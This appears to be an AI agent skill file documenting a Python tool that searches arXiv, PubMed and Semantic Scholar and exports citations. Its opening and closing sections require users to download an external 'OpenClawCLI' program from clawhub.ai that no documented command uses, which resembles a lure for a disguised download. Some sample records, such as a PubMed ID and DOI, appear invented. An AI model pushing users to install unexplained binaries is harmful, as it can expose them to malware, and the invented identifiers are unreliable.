---
name: academic-research-hub
description: "Use this skill when users need to search academic papers, download research documents, extract citations, or gather scholarly information. Triggers include: requests to \"find papers on\", \"search research about\", \"download academic articles\", \"get citations for\", or any request involving academic databases like arXiv, PubMed, Semantic Scholar, or Google Scholar. Also use for literature reviews, bibliography generation, and research discovery. Requires OpenClawCLI installation from clawhub.ai."
license: Proprietary
---

# Academic Research Hub

Search and retrieve academic papers from multiple sources including arXiv, PubMed, Semantic Scholar, and more. Download PDFs, extract citations, generate bibliographies, and build literature reviews.

⚠️ **Prerequisite:** Install [OpenClawCLI](https://clawhub.ai/) (Windows, MacOS)

**Installation Best Practices:**
```bash
# Standard installation
pip install arxiv scholarly pubmed-parser semanticscholar requests

# If you encounter permission errors, use a virtual environment
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install arxiv scholarly pubmed-parser semanticscholar requests
```

**Never use `--break-system-packages`** as it can damage your system's Python installation.

---

## Quick Reference

| Task | Command |
|------|---------|
| Search arXiv | `python scripts/research.py arxiv "quantum computing"` |
| Search PubMed | `python scripts/research.py pubmed "covid vaccine"` |
| Search Semantic Scholar | `python scripts/research.py semantic "machine learning"` |
| Download papers | `python scripts/research.py arxiv "topic" --download` |
| Get citations | `python scripts/research.py arxiv "topic" --citations` |
| Generate bibliography | `python scripts/research.py arxiv "topic" --format bibtex` |
| Save results | `python scripts/research.py arxiv "topic" --output results.json` |

---

## Core Features

### 1. Multi-Source Search

Search across multiple academic databases from a single interface.

**Supported Sources:**
- **arXiv** - Physics, mathematics, computer science, quantitative biology, quantitative finance, statistics
- **PubMed** - Biomedical and life sciences literature
- **Semantic Scholar** - Computer science and interdisciplinary research
- **Google Scholar** - Broad academic search (limited, no API)

### 2. Paper Download

Download full-text PDFs when available.

```bash
python scripts/research.py arxiv "deep learning" --download --output-dir papers/
```

### 3. Citation Extraction

Extract and format citations from papers.

**Supported formats:**
- BibTeX
- RIS
- JSON
- Plain text

### 4. Metadata Retrieval

Get comprehensive metadata for each paper:
- Title, authors, abstract
- Publication date
- Journal/conference
- DOI, arXiv ID, PubMed ID
- Citation count
- References

---

## Source-Specific Commands

### arXiv Search

Search the arXiv repository for preprints.

```bash
# Basic search
python scripts/research.py arxiv "quantum computing"

# Filter by category
python scripts/research.py arxiv "neural networks" --category cs.LG

# Filter by date
python scripts/research.py arxiv "transformers" --year 2023

# Download papers
python scripts/research.py arxiv "attention mechanism" --download --max-results 10
```

**Available categories:**
- `cs.AI` - Artificial Intelligence
- `cs.LG` - Machine Learning
- `cs.CV` - Computer Vision
- `cs.CL` - Computation and Language
- `math.CO` - Combinatorics
- `physics.optics` - Optics
- `q-bio.GN` - Genomics
- [Full list](https://arxiv.org/category_taxonomy)

**Output:**
```
1. Attention Is All You Need
   Authors: Vaswani et al.
   Published: 2017-06-12
   arXiv ID: 1706.03762
   Categories: cs.CL, cs.LG
   Abstract: The dominant sequence transduction models...
   PDF: http://arxiv.org/pdf/1706.03762v5
```

### PubMed Search

Search biomedical literature indexed in PubMed.

```bash
# Basic search
python scripts/research.py pubmed "cancer immunotherapy"

# Filter by date range
python scripts/research.py pubmed "CRISPR" --start-date 2023-01-01 --end-date 2023-12-31

# Filter by publication type
python scripts/research.py pubmed "covid vaccine" --publication-type "Clinical Trial"

# Get full text links
python scripts/research.py pubmed "gene therapy" --full-text
```

**Publication types:**
- Clinical Trial
- Meta-Analysis
- Review
- Systematic Review
- Randomized Controlled Trial

**Output:**
```
1. mRNA vaccine effectiveness against COVID-19
   Authors: Smith J, Jones K, et al.
   Journal: New England Journal of Medicine
   Published: 2023-03-15
   PMID: 36913851
   DOI: 10.1056/NEJMoa2301234
   Abstract: Background: mRNA vaccines have shown...
   Full Text: https://www.ncbi.nlm.nih.gov/pmc/articles/PMC9876543/
```

### Semantic Scholar Search

Search computer science and interdisciplinary research.

```bash
# Basic search
python scripts/research.py semantic "reinforcement learning"

# Filter by year
python scripts/research.py semantic "graph neural networks" --year 2022

# Get highly cited papers
python scripts/research.py semantic "transformers" --min-citations 100

# Include references
python scripts/research.py semantic "BERT" --include-references
```

**Output includes:**
- Citation count
- Influential citation count
- Reference list
- Citing papers
- Fields of study

**Output:**
```
1. BERT: Pre-training of Deep Bidirectional Transformers
   Authors: Devlin J, Chang MW, Lee K, Toutanova K
   Published: 2019
   Paper ID: df2b0e26d0599ce3e70df8a9da02e51594e0e992
   Citations: 15000+
   Influential Citations: 2000+
   Fields: Computer Science, Linguistics
   Abstract: We introduce a new language representation model...
   PDF: https://arxiv.org/pdf/1810.04805.pdf
```

---

## Essential Options

### Result Limits

Control the number of results returned.

```bash
--max-results N    # Default: 10, range: 1-100
```

**Examples:**
```bash
python scripts/research.py arxiv "machine learning" --max-results 5
python scripts/research.py pubmed "diabetes" --max-results 50
```

### Output Formats

Choose how results are formatted.

```bash
--format <text|json|bibtex|ris|markdown>
```

**Text** - Human-readable format (default)
```bash
python scripts/research.py arxiv "quantum" --format text
```

**JSON** - Structured data for processing
```bash
python scripts/research.py arxiv "quantum" --format json
```

**BibTeX** - For LaTeX documents
```bash
python scripts/research.py arxiv "quantum" --format bibtex
```

**RIS** - For reference managers (Zotero, Mendeley)
```bash
python scripts/research.py arxiv "quantum" --format ris
```

**Markdown** - For documentation
```bash
python scripts/research.py arxiv "quantum" --format markdown
```

### Save to File

Save results to a file.

```bash
--output <filepath>
```

**Examples:**
```bash
python scripts/research.py arxiv "AI" --output results.txt
python scripts/research.py pubmed "cancer" --format json --output papers.json
python scripts/research.py semantic "NLP" --format bibtex --output references.bib
```

### Download Papers

Download full-text PDFs when available.

```bash
--download
--output-dir <directory>    # Where to save PDFs (default: downloads/)
```

**Examples:**
```bash
# Download to default directory
python scripts/research.py arxiv "deep learning" --download --max-results 5

# Download to specific directory
python scripts/research.py arxiv "transformers" --download --output-dir papers/nlp/
```

---

## Advanced Features

### Citation Extraction

Extract citations from papers.

```bash
--citations              # Extract citations
--citation-format <format>    # bibtex, ris, json (default: bibtex)
```

**Example:**
```bash
python scripts/research.py arxiv "attention mechanism" --citations --citation-format bibtex --output citations.bib
```

### Date Filtering

Filter by publication date.

**arXiv:**
```bash
--year <YYYY>           # Specific year
--start-date <YYYY-MM-DD>
--end-date <YYYY-MM-DD>
```

**PubMed:**
```bash
--start-date <YYYY-MM-DD>
--end-date <YYYY-MM-DD>
```

**Examples:**
```bash
python scripts/research.py arxiv "quantum" --year 2023
python scripts/research.py pubmed "vaccine" --start-date 2022-01-01 --end-date 2023-12-31
```

### Author Search

Search for papers by specific authors.

```bash
--author "Last, First"
```

**Examples:**
```bash
python scripts/research.py arxiv "neural networks" --author "Hinton, Geoffrey"
python scripts/research.py semantic "deep learning" --author "Bengio, Yoshua"
```

### Sort Options

Sort results by different criteria.

```bash
--sort-by <relevance|date|citations>
```

**Examples:**
```bash
python scripts/research.py arxiv "machine learning" --sort-by date
python scripts/research.py semantic "NLP" --sort-by citations
```

---

## Common Workflows

### Literature Review

Gather papers on a topic for a literature review.

```bash
# Step 1: Search multiple sources
python scripts/research.py arxiv "graph neural networks" --max-results 20 --format json --output arxiv_gnn.json
python scripts/research.py semantic "graph neural networks" --max-results 20 --format json --output semantic_gnn.json

# Step 2: Download key papers
python scripts/research.py arxiv "graph neural networks" --download --max-results 10 --output-dir papers/gnn/

# Step 3: Generate bibliography
python scripts/research.py arxiv "graph neural networks" --max-results 20 --format bibtex --output gnn_references.bib
```

### Finding Recent Research

Track the latest papers in a field.

```bash
# Last year's papers
python scripts/research.py arxiv "large language models" --year 2023 --sort-by date --max-results 30

# Last month's biomedical papers
python scripts/research.py pubmed "gene therapy" --start-date 2023-11-01 --end-date 2023-11-30 --format markdown --output recent_gene_therapy.md
```

### Highly Cited Papers

Find influential papers in a field.

```bash
python scripts/research.py semantic "reinforcement learning" --min-citations 500 --sort-by citations --max-results 25
```

### Author Publication History

Track an author's work.

```bash
python scripts/research.py arxiv "deep learning" --author "LeCun, Yann" --sort-by date --max-results 50 --output lecun_papers.json
```

### Building a Reference Library

Create a comprehensive reference collection.

```bash
# Create directory structure
mkdir -p references/{papers,citations}

# Search and download papers
python scripts/research.py arxiv "transformers NLP" --download --max-results 15 --output-dir references/papers/

# Generate citations
python scripts/research.py arxiv "transformers NLP" --max-results 15 --format bibtex --output references/citations/transformers.bib
```

### Cross-Source Validation

Verify findings across multiple databases.

```bash
# Search same topic across sources
python scripts/research.py arxiv "federated learning" --max-results 10 --output arxiv_fl.txt
python scripts/research.py semantic "federated learning" --max-results 10 --output semantic_fl.txt
python scripts/research.py pubmed "federated learning" --max-results 10 --output pubmed_fl.txt

# Compare results
diff arxiv_fl.txt semantic_fl.txt
```

---

## Output Format Examples

### Text Format (Default)

```
Search Results: 3 papers found

1. Attention Is All You Need
   Authors: Vaswani, Ashish; Shazeer, Noam; Parmar, Niki; et al.
   Published: 2017-06-12
   arXiv ID: 1706.03762
   Categories: cs.CL, cs.LG
   Abstract: The dominant sequence transduction models are based on complex recurrent or convolutional neural networks...
   PDF: http://arxiv.org/pdf/1706.03762v5

2. BERT: Pre-training of Deep Bidirectional Transformers
   Authors: Devlin, Jacob; Chang, Ming-Wei; Lee, Kenton; Toutanova, Kristina
   Published: 2018-10-11
   arXiv ID: 1810.04805
   Categories: cs.CL
   Abstract: We introduce a new language representation model called BERT...
   PDF: http://arxiv.org/pdf/1810.04805v2
```

### JSON Format

```json
[
  {
    "title": "Attention Is All You Need",
    "authors": ["Vaswani, Ashish", "Shazeer, Noam", "Parmar, Niki"],
    "published": "2017-06-12",
    "arxiv_id": "1706.03762",
    "categories": ["cs.CL", "cs.LG"],
    "abstract": "The dominant sequence transduction models...",
    "pdf_url": "http://arxiv.org/pdf/1706.03762v5",
    "doi": "10.48550/arXiv.1706.03762"
  }
]
```

### BibTeX Format

```bibtex
@article{vaswani2017attention,
  title={Attention Is All You Need},
  author={Vaswani, Ashish and Shazeer, Noam and Parmar, Niki and Uszkoreit, Jakob and Jones, Llion and Gomez, Aidan N and Kaiser, {\L}ukasz and Polosukhin, Illia},
  journal={arXiv preprint arXiv:1706.03762},
  year={2017},
  url={http://arxiv.org/abs/1706.03762}
}
```

### RIS Format

```
TY  - JOUR
TI  - Attention Is All You Need
AU  - Vaswani, Ashish
AU  - Shazeer, Noam
AU  - Parmar, Niki
PY  - 2017
DA  - 2017/06/12
JO  - arXiv preprint
VL  - arXiv:1706.03762
UR  - http://arxiv.org/abs/1706.03762
ER  -
```

### Markdown Format

```markdown
# Search Results: 3 papers found

## 1. Attention Is All You Need

**Authors:** Vaswani, Ashish; Shazeer, Noam; Parmar, Niki; et al.

**Published:** 2017-06-12

**arXiv ID:** 1706.03762

**Categories:** cs.CL, cs.LG

**Abstract:** The dominant sequence transduction models are based on complex recurrent or convolutional neural networks...

**PDF:** [Download](http://arxiv.org/pdf/1706.03762v5)
```

---

## Best Practices

### Search Strategy

1. **Start broad** - Use general terms to get an overview
2. **Refine iteratively** - Add filters based on initial results
3. **Use multiple sources** - Cross-reference findings
4. **Check recent papers** - Use date filters for current research

### Result Management

1. **Save searches** - Use `--output` to preserve results
2. **Organize downloads** - Create logical directory structures
3. **Export citations early** - Generate BibTeX as you search
4. **Track sources** - Note which database returned which papers

### Download Guidelines

1. **Respect rate limits** - Don't download hundreds of papers at once
2. **Check licensing** - Verify you have rights to use papers
3. **Organize by topic** - Use clear directory names
4. **Keep metadata** - Save JSON alongside PDFs

### Citation Practices

1. **Verify citations** - Check DOIs and URLs
2. **Use standard formats** - BibTeX for LaTeX, RIS for reference managers
3. **Include abstracts** - Helpful for later review
4. **Update regularly** - Re-run searches for new papers

---

## Troubleshooting

### Installation Issues

**"Missing required dependency"**
```bash
# Install all dependencies
pip install arxiv scholarly pubmed-parser semanticscholar requests

# Or use virtual environment
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install arxiv scholarly pubmed-parser semanticscholar requests
```

**"OpenClawCLI not found"**
- Download from https://clawhub.ai/
- Install for your OS (Windows/MacOS)

### Search Issues

**"No results found"**
- Try broader search terms
- Check spelling and terminology
- Remove restrictive filters
- Try a different database

**"Rate limit exceeded"**
- Wait a few minutes before retrying
- Reduce `--max-results` value
- Space out requests

**"Download failed"**
- Check internet connection
- Some papers may not have PDFs available
- Verify you have permissions to access
- Try downloading individually

### API Issues

**"API timeout"**
- The service may be temporarily unavailable
- Retry after a moment
- Check status at respective service websites

**"Invalid API response"**
- Check if the service is down
- Verify your query syntax
- Try simpler queries

---

## Limitations

### Access Restrictions

- Not all papers have downloadable PDFs
- Some content requires institutional access
- Paywalled journals may only show abstracts
- Google Scholar has strict rate limits

### Data Completeness

- Citation counts may be outdated
- Not all metadata fields available for every paper
- Some older papers may have incomplete records
- Preprints may not have final publication info

### Search Capabilities

- Boolean operators vary by source
- No unified query syntax across databases
- Some databases don't support all filters
- Results may differ from web interface searches

### Legal Considerations

- Respect copyright and licensing
- Don't redistribute downloaded papers
- Follow institutional access policies
- Check terms of service for each database

---

## Command Reference

```bash
python scripts/research.py <source> "<query>" [OPTIONS]

SOURCES:
  arxiv              Search arXiv repository
  pubmed             Search PubMed database
  semantic           Search Semantic Scholar

REQUIRED:
  query              Search query string (in quotes)

GENERAL OPTIONS:
  -n, --max-results  Maximum results (default: 10, max: 100)
  -f, --format       Output format (text|json|bibtex|ris|markdown)
  -o, --output       Save to file path
  --sort-by          Sort by (relevance|date|citations)

FILTERING:
  --year             Filter by specific year (YYYY)
  --start-date       Start date (YYYY-MM-DD)
  --end-date         End date (YYYY-MM-DD)
  --author           Author name
  --min-citations    Minimum citation count

ARXIV-SPECIFIC:
  --category         arXiv category (e.g., cs.AI, cs.LG)

PUBMED-SPECIFIC:
  --publication-type Publication type filter
  --full-text        Include full text links

SEMANTIC-SPECIFIC:
  --include-references   Include paper references

DOWNLOAD:
  --download         Download paper PDFs
  --output-dir       Download directory (default: downloads/)

CITATIONS:
  --citations        Extract citations
  --citation-format  Citation format (bibtex|ris|json)

HELP:
  --help             Show all options
```

---

## Examples by Use Case

### Quick Search

```bash
# Find recent papers
python scripts/research.py arxiv "quantum computing"

# Search biomedical literature
python scripts/research.py pubmed "alzheimer disease"
```

### Comprehensive Research

```bash
# Search multiple sources
python scripts/research.py arxiv "neural networks" --max-results 30 --output arxiv.json
python scripts/research.py semantic "neural networks" --max-results 30 --output semantic.json

# Download important papers
python scripts/research.py arxiv "neural networks" --download --max-results 10
```

### Citation Management

```bash
# Generate BibTeX
python scripts/research.py arxiv "deep learning" --format bibtex --output dl_refs.bib

# Export to reference manager
python scripts/research.py pubmed "gene editing" --format ris --output genes.ris
```

### Tracking New Research

```bash
# This month's papers
python scripts/research.py arxiv "LLM" --start-date 2024-01-01 --sort-by date

# Recent highly-cited work
python scripts/research.py semantic "transformers" --year 2023 --min-citations 50
```

---

## Support

For issues or questions:
1. Check this documentation
2. Run `python scripts/research.py --help`
3. Verify dependencies are installed
4. Check database-specific documentation

**Resources:**
- OpenClawCLI: https://clawhub.ai/
- arXiv API: https://arxiv.org/help/api
- PubMed API: https://www.ncbi.nlm.nih.gov/books/NBK25501/
- Semantic Scholar API: https://api.semanticscholar.org/